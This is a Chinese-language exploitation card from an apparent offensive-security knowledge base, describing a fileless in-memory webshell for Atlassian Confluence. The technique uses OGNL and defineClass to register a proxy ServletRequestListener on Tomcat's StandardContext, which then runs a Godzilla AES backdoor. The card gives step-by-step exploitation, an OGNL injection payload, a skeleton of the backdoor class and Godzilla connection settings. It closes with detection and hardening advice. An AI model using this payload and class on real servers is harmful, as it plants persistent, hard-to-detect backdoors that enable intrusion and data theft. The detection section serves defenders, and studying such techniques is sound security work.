---
id: web-java-component-confluence-servlet-request-listener-memshell
title: Confluence ServletRequestListener 内存马：OGNL defineClass 定义类 + ServletActionContextCompatManager 取 StandardContext 注册动态代理
type: scenario
domain: web
path: web/java/component/confluence
technique: confluence-servletrequestlistener-dynamic-proxy-memshell
aliases:
- ConfluenceFilterMemshell
- Confluence 内存马
- addApplicationEventListener
- ServletActionContextCompatManager
- Godzilla 内存马 Confluence
- ReflectUtils defineClass 内存马
- Confluence 哥斯拉内存马
tags:
- java
- confluence
- atlassian
- tomcat
- memshell
- defineclass
- servletrequestlistener
- dynamic-proxy
- ognl
- godzilla
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-11'
updated: '2026-11-11'
verification:
  verified_by: verifier-V520
  verified_at: '2026-11-11T13:13:37+08:00'
  notes: 已对照原文代码与截图核对：ReflectUtils.defineClass(类名,Base64Utils.decodeFromString,当前线程ContextClassLoader)(图11)、ConfluenceFilterMemshell 构造器用 ServletActionContextCompatManager.getRequest() 反射两层 context 取 StandardContext、addApplicationEventListener 注册动态代理 ServletRequestListener(jakarta/javax 兜底)、requestInitialized 触发哥斯拉 AES 后门、md5(password+key) 前后16字符包裹回包，均与原文一致；工具执行 exploit success(图12)、哥斯拉 /browsepeople.action JavaDynamicPayload/JAVA_AES_BASE64 测试 Success(图13) 一致。dedup 复核：与 web-java-component-tomcat-listener-memshell 最终 sink 相同但入口(OGNL defineClass vs JSP)、取 Context(ServletActionContextCompatManager vs request.getServletContext/Request.getContext)、载荷形态(动态代理+哥斯拉AES vs 具名Listener+cmd参数)均不同，按入口变体独立收录成立，不属于同链重复。原文未写受影响版本，不设。未验证点：未实际注入复测。
---

## 一句话结论

在已取得 Confluence OGNL/代码执行（如 CVE-2023-22527）的前提下，用 `@org.springframework.cglib.core.ReflectUtils@defineClass(...)` 把内存马类定义进当前线程 ClassLoader；类构造器通过 `ServletActionContextCompatManager` 反射取出 Tomcat `StandardContext`，把动态代理的 `ServletRequestListener` 注册进 `applicationEventListeners`。此后每个请求的 `requestInitialized` 事件都会回调代理，按密码参数 AES 解密并 defineClass 哥斯拉 payload，形成不落盘、随请求触发的内存马。

## 原理

- **类定义**：Confluence classpath 自带 Spring，`org.springframework.cglib.core.ReflectUtils.defineClass(String, byte[], ClassLoader)` 是公开静态方法，可在 OGNL 中直接调用。父 ClassLoader 取 `Thread.currentThread().getContextClassLoader()`，保证内存马类能引用 Confluence/Tomcat 的类（也可用 `MLet` 构造一个 URLClassLoader 作为父加载器）。
- **取出 StandardContext**：Confluence 的 `com.atlassian.confluence.compat.struts2.servletactioncontext.ServletActionContextCompatManager` 无参构造后可调用 `getRequest()` 拿到当前请求；`request.getServletContext()` 返回 `ApplicationContextFacade`，反射其 `context` 字段得到 `ApplicationContext`，再反射一次 `context` 字段即 Tomcat `StandardContext`（原文代码对两层对象都调用 `getFieldValue(..., "context")`）。
- **注册监听器**：`StandardContext.addApplicationEventListener(Object)` 是 Tomcat 内部方法，反射 `setAccessible(true)` 后可动态追加 `ServletRequestListener`。用 `Proxy.newProxyInstance(contextClassLoader, new Class[]{ServletRequestListener.class}, handler)` 生成动态代理（运行时按 `jakarta.servlet.ServletRequestListener`、`javax.servlet.ServletRequestListener` 依次尝试），不必引入具体实现类。
- **触发路径**：Tomcat 对每个请求依次调用已注册 listener 的 `requestInitialized/requestDestroyed`；代理 `invoke` 判断方法名，命中 `requestInitialized` 即进入后门逻辑。内存马因此不依赖任何 URL 路由，任意请求都会触发。
- **哥斯拉通信**：后门检查请求 `Content-Type` 含 `application/x-www-form-urlencoded`，读取自定义密码参数；`Base64` 解码后 AES 解密为字节码，用 `ConfluenceFilterMemshell(request.getClass().getClassLoader()).defineClass(...)` 定义模板类，再用 `equals(...)` 链把请求、数据、输出流传给模板实例；回包被 `md5(password+key)` 的前 16/后 16 字符包裹，中间为 AES 加密的 Base64 数据。
- **为什么可行**：Confluence 运行在 Tomcat 上，监听器列表运行时可变；defineClass 出的类由 Confluence 的 ClassLoader 持有，生命周期与进程一致，不写磁盘、不新增路由，传统 webshell 文件查杀失效。

## 触发条件

- 已获得可在 Confluence 进程内执行 OGNL/Java 的能力（如 CVE-2023-22527 `text-inline.vm` 注入）。
- 目标 classpath 含 Spring（`ReflectUtils`）与 Servlet API（`ServletRequestListener`）。
- 内存马类字节码较长，注入前需先用 `@ognl.Ognl@applyExpressionMaxLength(...)` 放开 OGNL 长度上限。
- 运行环境未通过 SecurityManager 禁止 `setAccessible`（Java 17 前或未启用）。

## 利用步骤

1. 编写内存马类（继承 `ClassLoader` 并实现 `InvocationHandler`，构造器注册 listener，`requestInitialized` 中处理后门流量），编译后用 AES 加密的哥斯拉 JavaDynamicPayload 作为执行模板。
2. 用 `@ognl.Ognl@applyExpressionMaxLength(20000000)` 放开长度限制。
3. 发送 defineClass 表达式：`ReflectUtils.defineClass('<类名>', Base64Utils.decodeFromString('<base64 类字节码>'), Thread.currentThread().getContextClassLoader()).newInstance()`，构造器随即完成 listener 注册。
4. 用哥斯拉配置相同密码/密钥，URL 填任意已存在路径（原文 `/browsepeople.action`），类型 `JavaDynamicPayload`、加密器 `JAVA_AES_BASE64`，测试连接成功即内存马可用。
5. 原文提供了改写自 CVE-2022-26134 Godzilla 内存马的现成工具，可直接生成并注入。

## PoC

OGNL defineClass 表达式（类名与 base64 为占位）：

```text
poc=(@org.springframework.cglib.core.ReflectUtils@defineClass('ConfluenceFilterMemshell',@org.springframework.util.Base64Utils@decodeFromString('<base64 class bytes>'),@java.lang.Thread@currentThread().getContextClassLoader())).newInstance()
```

内存马类关键逻辑（非完整代码）：

```java
public class ConfluenceFilterMemshell extends ClassLoader implements InvocationHandler {
    public ConfluenceFilterMemshell() {
        Class<?> listener = Class.forName("jakarta.servlet.ServletRequestListener"); // 失败则 javax
        Object proxy = Proxy.newProxyInstance(
                Thread.currentThread().getContextClassLoader(),
                new Class[]{listener}, this);
        // ServletActionContextCompatManager -> getRequest() -> getServletContext()
        // -> 反射 context 字段两次得到 StandardContext
        Object standardContext = getStandardContext();
        standardContext.getClass().getDeclaredMethod("addApplicationEventListener", Object.class)
                .invoke(standardContext, proxy);
    }
    public Object invoke(Object proxy, Method method, Object[] args) {
        if (method.getName().equals("requestInitialized")) backDoor(args[0]);
        return null;
    }
    // backDoor: requestInitialized -> getServletRequest -> Content-Type 判断
    // -> 参数 Base64 解码 + AES 解密 -> defineClass -> 模板 class 执行 -> 加密回包
}
```

注入成功后，哥斯拉连接任意路径、密码/密钥与类内一致即可（原文工具执行输出 `exploit success`，哥斯拉 Shell 设置测试连接 `Success!`）。

## 变体与关联

- **agent 内存马**：已有反弹 shell 时可用 vagent 等 tool 以 `agentmain` 方式 attach 注入，支持哥斯拉连接（原文的工具思路）；与 defineClass 内存马相比不依赖 OGNL 长度与类加载器条件。
- **无反连 Windows**：一字一句 echo 写出 JSP 木马到 Web 目录（原文一句话思路，未展开）。
- **同产品入口**：本卡通常接在 [[web-java-component-confluence-cve-2023-22527-text-inline-ognl-rce]] 之后，长度限制见 [[web-java-expression-ognl-expression-maxlength-apply-bypass]]。
- **同类 Tomcat 内存马**：[[web-java-component-tomcat-listener-memshell]]、[[web-java-component-tomcat-listener-memshell-getparameter-body-consumed]] 讲的是通过请求参数/反序列化入口注册 listener；本卡是 Confluence OGNL 入口 + `ServletActionContextCompatManager` 取 Context 的特定组合，可对比 Context 获取方式。

## 检测与防御

- **修复前置漏洞**：升级 Confluence 修复版本；限制 `/template/*.vm` 未授权访问，阻断注入入口。
- **运行时检测**：枚举 `StandardContext.applicationEventListeners`，检查是否存在动态代理（`$Proxy`）或非 Tomcat 自带类的 listener；监控 `ReflectUtils.defineClass`、`addApplicationEventListener`、`setAccessible` 的异常调用（RASP/Java agent）。
- **流量特征**：哥斯拉 AES Base64 请求有固定形态（超长 base64 表单参数、固定回包结构）；原文内存马对每个请求设置 `X-Cmd-Result: ok` 响应头，可作为检测特征。
- **内存查杀**：排查 ClassLoader 中来源不明的类（尤其 `ConfluenceFilterMemshell` 之类自定义名），以及 `applicationEventListeners` 中被追加的代理对象。
- **加固**：Confluence 不以 root 运行；开启 RASP；对 Web 容器内部 API 的反射调用做监控。
